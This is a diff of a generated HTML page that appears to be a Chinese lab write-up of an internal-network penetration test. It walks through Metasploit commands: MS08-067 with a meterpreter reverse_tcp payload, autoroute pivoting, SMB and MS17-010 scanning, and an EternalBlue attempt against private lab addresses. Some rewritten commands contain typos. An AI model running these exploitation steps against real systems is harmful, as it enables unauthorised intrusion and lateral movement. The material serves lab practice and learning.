@@ -136,7 +136,7 @@ article: http://ogp.me/ns/article#">
       
       
         <span class="post-updated">
-          最后更新于 <time datetime="2026-01-16T07:55:28.241Z">2026-01-16</time>
+          最后更新于 <time datetime="2026-01-19T04:47:29.045Z">2026-01-19</time>
         </span>
       
       <span style="margin-left:10px;">👁<span id="busuanzi_value_page_pv"></span></span>
@@ -182,8 +182,8 @@ article: http://ogp.me/ns/article#">
 <p>⚠️ 问题：IIS 非常不稳定，多次尝试后 <strong>IIS 服务直接崩溃</strong>，攻击失败。</p>
 </blockquote>
 <hr>
-<h3 id="备用方案：MS08-067"><a href="#备用方案：MS08-067" class="headerlink" title="备用方案：MS08-067"></a>备用方案：MS08-067</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">search ms08-067</span><br><span class="line">use exploit/windows/smb/ms08_067_netapi</span><br><span class="line">show options</span><br><span class="line"><span class="built_in">set</span> RHOST 192.168.59.135</span><br><span class="line"><span class="built_in">set</span> PAYLOAD windows/meterpreter/reverse_tcp</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
-
+<h3 id="备用方案：MS08-067"><a href="#备用方案：MS08-067" class="headerlink" title="备用方案：MS08-067"></a>备用方案：MS08-067</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#查找漏洞模块</span></span><br><span class="line">search ms08-067</span><br><span class="line"><span class="comment">#使用所需模块</span></span><br><span class="line">use 0</span><br><span class="line"><span class="comment">#查看攻击参数（内容）</span></span><br><span class="line">show options   //RHOST：目标靶机IP，RPORT：目标靶机端口，LHOST：本机IP，LPORT：本机监听端口</span><br><span class="line"><span class="comment">#设置攻击参数</span></span><br><span class="line"><span class="built_in">set</span> + [Name] + [参数]</span><br><span class="line"><span class="comment">#查看有效攻击目标</span></span><br><span class="line">show targets</span><br><span class="line"><span class="comment">#找到目标靶机的型号并设置</span></span><br><span class="line"><span class="built_in">set</span> TARDET [ID]</span><br><span class="line"><span class="comment">#启动攻击后进入靶机</span></span><br><span class="line">expolit</span><br></pre></td></tr></table></figure>
+<p>!(images&#x2F;image.png)<br>!(images&#x2F;image2.png)<br>!(images&#x2F;image3.png)<br>!(images&#x2F;image4.png)<br>!(images&#x2F;image5.png)</p>
 <p>由于 <strong>Windows 2003 版本过旧</strong>，在构造 Payload 时直接使用 Meterpreter，避免后续升级失败。</p>
 <hr>
 <h2 id="第三阶段：Shell-升级为-Meterpreter"><a href="#第三阶段：Shell-升级为-Meterpreter" class="headerlink" title="第三阶段：Shell 升级为 Meterpreter"></a>第三阶段：Shell 升级为 Meterpreter</h2><p>如果只拿到 <code>command shell</code>，需要升级为 Meterpreter（后续操作必须使用）。</p>
@@ -200,7 +200,7 @@ article: http://ogp.me/ns/article#">
 <p>重点观察是否存在新的内网网段，如：<code>10.10.10.0/24</code>、<code>192.168.116.0/24</code></p>
 </blockquote>
 <h3 id="2-添加路由（Autoroute）"><a href="#2-添加路由（Autoroute）" class="headerlink" title="2. 添加路由（Autoroute）"></a>2. 添加路由（Autoroute）</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run autoroute -s 10.10.10.0/24</span><br><span class="line">background</span><br></pre></td></tr></table></figure>
-
+<p>!(images&#x2F;image7.png)</p>
 <hr>
 <h2 id="第五阶段：内网扫描（Windows-2008）"><a href="#第五阶段：内网扫描（Windows-2008）" class="headerlink" title="第五阶段：内网扫描（Windows 2008）"></a>第五阶段：内网扫描（Windows 2008）</h2><h3 id="1-SMB-存活扫描"><a href="#1-SMB-存活扫描" class="headerlink" title="1. SMB 存活扫描"></a>1. SMB 存活扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/smb/smb_version</span><br><span class="line"><span class="built_in">set</span> RHOSTS 192.168.116.1-254</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
 
@@ -209,11 +209,11 @@ article: http://ogp.me/ns/article#">
 <li><code>192.168.116.128</code></li>
 </ul>
 <h3 id="2-MS17-010-漏洞检测"><a href="#2-MS17-010-漏洞检测" class="headerlink" title="2. MS17-010 漏洞检测"></a>2. MS17-010 漏洞检测</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/smb/smb_ms17_010</span><br><span class="line"><span class="built_in">set</span> RHOSTS 192.168.116.128</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
-
+<p>!(images&#x2F;image8.png)</p>
 <p>返回 <code>VULNERABLE</code>，确认存在 <strong>永恒之蓝漏洞</strong>。</p>
 <hr>
 <h2 id="第六阶段：横向移动（攻击-Windows-2008）"><a href="#第六阶段：横向移动（攻击-Windows-2008）" class="headerlink" title="第六阶段：横向移动（攻击 Windows 2008）"></a>第六阶段：横向移动（攻击 Windows 2008）</h2><h3 id="尝试-1：EternalBlue（失败）"><a href="#尝试-1：EternalBlue（失败）" class="headerlink" title="尝试 1：EternalBlue（失败）"></a>尝试 1：EternalBlue（失败）</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line"><span class="built_in">set</span> RHOSTS 192.168.116.128</span><br><span class="line"><span class="built_in">set</span> PAYLOAD windows/x64/meterpreter/bind_tcp</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
-
+<p>!(images&#x2F;image9.png)</p>
 <blockquote>
 <p>❌ 结果：</p>
 <ul>
